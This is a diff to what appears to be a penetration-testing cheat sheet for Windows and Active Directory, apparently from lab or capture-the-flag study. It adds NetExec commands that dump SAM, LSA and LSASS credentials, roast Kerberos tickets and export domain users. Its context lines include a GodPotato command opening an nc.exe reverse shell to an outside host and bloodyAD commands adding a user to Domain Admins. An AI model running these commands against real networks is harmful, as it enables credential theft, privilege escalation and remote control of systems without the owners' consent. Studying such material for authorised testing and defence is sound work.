@@ -58,7 +58,15 @@ GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe 10.10.14.X 443 -e cmd.exe"
 
 ### NXC
 ```bash
-
+nxc smb 10.10.10.10 -u user -p pass --shares
+nxc smb 10.10.10.10 -u user -p pass --local-auth
+nxc smb 10.10.10.10 -u admin -p pass --sam
+nxc smb 10.10.10.10 -u admin -p pass --lsa
+nxc smb 10.10.10.10 -u admin -p pass -M lsassy
+nxc ldap 10.10.10.10 -u user -p pass --asreproast asrep.txt
+nxc ldap 10.10.10.10 -u user -p pass --kerberoasting kerb.txt
+nxc ldap 10.10.10.10 -u user -p pass --bloodhound --collection All --dns-server 10.10.10.10
+nxc ldap 10.10.10.10 -u user -p pass --users-export users.txt
 ```
 
 ### Ligolo
@@ -92,7 +100,7 @@ Lsadump::secrets
 ### BloodyAD
 ```bash
 bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get object "Domain Admins"
-bloodyAD -d DOMAIN.LOCAL --host DC_IP -u USERNAME -p PASSWORD get writable --otype USER --detail
+bloodyAD -d DOMAIN.LOCAL --host DC_IP -u USERNAME -p PASSWORD get writable --detail
 bloodyAD -H 10.10.10.10 -d bloody -u admin -p pass get membership john.doe
 bloodyAD -H 10.10.10.10 -d bloody -u admin -p pass add groupMember “Domain Admins” “john.doe”
 python net.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> group -name "<TargetGroup>" -add "<TargetUser>"
